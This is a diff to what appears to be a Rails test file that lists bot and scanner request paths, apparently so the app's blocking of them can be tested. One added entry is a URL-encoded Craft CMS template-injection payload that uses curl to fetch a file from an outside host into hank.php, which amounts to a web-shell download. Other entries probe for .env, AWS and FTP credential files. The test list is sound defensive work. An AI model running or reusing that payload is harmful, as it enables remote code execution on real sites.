@@ -1,5 +1,6 @@
 require 'rails_helper'
 
+# rubocop:disable Layout/LineLength
 GET_PATHS = %w[
   .ftpconfig
   /!==this.readyState
@@ -31,6 +32,7 @@ GET_PATHS = %w[
   /2022
   /360/static/js/iku.js
   /@/admin/
+  /App_master/Telerik.Web.UI.WebResource.axd?type=rau
   /Content/Wap/base.css
   /Content/common/web/CommonActivity.css
   /Content/css/wzwstylel.css
@@ -57,6 +59,8 @@ GET_PATHS = %w[
   /Public/mobile/js/config.js
   /Scripts/common.js
   /Security/login
+  /Telerik.Web.UI.WebResource.axd?type=rau
+  /Template/Mobile/js/main.js
   /Templates/user/finance/css/userPay.css
   /Templates/user/js/global.js
   /_profiler/phpinfo
@@ -69,6 +73,7 @@ GET_PATHS = %w[
   /access/admin/
   /accessgranted/admin/
   /action/admin/
+  /actions/seomatic/meta-container/all-meta-containers?uri=%7B%7Bcraft.app.view.evaluateDynamicContent%28%27print%28system%28%22curl+https%3A%2F%2Fcxtreme.rbow.site%2Fedit.txt+%3E+hank.php%22%29%29%3B%27%29%7D%7D
   /actuator/env
   /adm
   /adm/admin/
@@ -101,9 +106,14 @@ GET_PATHS = %w[
   /api/v1/about
   /api/wallet/redDetail
   /apis/api/index
+  /app/common/getRegisterSet
   /app_master/telerik.web.ui.dialoghandler.aspx
   /appxz/index.html
+  /assets/app-manifest.json
+  /assets/dist/static/js/vendor_prod.js
+  /assets/extension/market/css/mt4.css
   /assets/res/mods/room.js
+  /assets/room/css/room_mobile.css
   /auth
   /auth/login/admin/
   /aws.yml
@@ -135,6 +145,8 @@ GET_PATHS = %w[
   /css/app.css
   /css/main.css
   /css/nsc/reset.css
+  /css/view/main/goin.css
+  /css/view/main/style.css
   /data/json/config.json
   /demo/
   /demo/index.php/admin/
@@ -157,8 +169,10 @@ GET_PATHS = %w[
   /getConfig/listPopFrame.do
   /h5/
   /home/GetQrCodeInfo
+  /home/login/login_index.html
   /homes/
   /html/js/editor/fckeditor/editor/filemanager/connectors/test.html
+  /iframe/rankgiftgotapi/1005
   /im/
   /im/App/config
   /im/h5/
@@ -168,8 +182,11 @@ GET_PATHS = %w[
   /images/src_images_but_dianz_s.png
   /include/fckeditor/editor/filemanager/connectors/test.html
   /index.php/admin/
+  /index/Mobile/fenshi?code=sz002405
   /index/Mobile/kline_week
   /index/index/purchase.html
+  /index/login/register
+  /infe/rest/fig/advertise/common.json?mobile_open=1
   /infe/rest/flash/getServerIP.json
   /install/
   /ipl/app/flash/publicbmw/ball/FigLeaf.js?site=member
@@ -179,11 +196,15 @@ GET_PATHS = %w[
   /js/fckeditor/editor/filemanager/connectors/test.html
   /js/home.js
   /js/mage/cookies.js
+  /json/configs/permanent/permanent-lottery-config-list.json
   /kkrps/im_group/show_members
   /kkrps/im_group/showmembers
   /langConfig.js
+  /lanren/css/global.css
   /laravel/.env
+  /lib/client/etc/hometu.jpg
   /loan
+  /login
   /login.asp
   /login.html
   /m/
@@ -196,6 +217,7 @@ GET_PATHS = %w[
   /main
   /manager/
   /market/getStockBaseInfo?stockCodeInternal=2658
+  /market/market-ws/iframe.html
   /member/js/lang_zh_CN.js
   /n/news/banner?column_id=303
   /new
@@ -218,6 +240,7 @@ GET_PATHS = %w[
   /phpinfo
   /phpmyadmin/fubar
   /plugins/fubar
+  /portal/index/protocol.html
   /providers/htmleditorproviders/telerik/telerik.web.ui.dialoghandler.aspx
   /proxy/games
   /proxy/settings
@@ -253,6 +276,7 @@ GET_PATHS = %w[
   /sites/all/modules/fckeditor/fckeditor/editor/filemanager/connectors/test.html
   /sites/default/files/
   /sito/wp-includes/wlwmanifest.xml
+  /skin/main/onload.js
   /staging/index.php/admin/
   /staging/rss/catalog/notifystock
   /staging/rss/catalog/review
@@ -284,6 +308,7 @@ GET_PATHS = %w[
   /store/rss/catalog/review
   /store/rss/order/new
   /temp/
+  /template/920ka/css/lsy.css
   /template/920ka/js/woodyapp.js
   /template/js/comm/Confrim.js
   /test/
@@ -296,6 +321,7 @@ GET_PATHS = %w[
   /user/admin/
   /user/userlist
   /v1/
+  /v1/management/tenant/getSpeedDomain
   /v2/
   /vendor/.env
   /views/commData/commonSite.js
@@ -350,9 +376,13 @@ GET_PATHS = %w[
   /xxsssseee
   /xy/
 ].freeze
+# rubocop:enable Layout/LineLength
 
 POST_PATHS = %w[
   /
+  /api/system/system/config/get
+  /auth/oauth/token
+  /index.php/api/other/appSetting
   /melody/api/v1/pageconfig/list
   /user/getAllNicknames
   /wp-booking.php
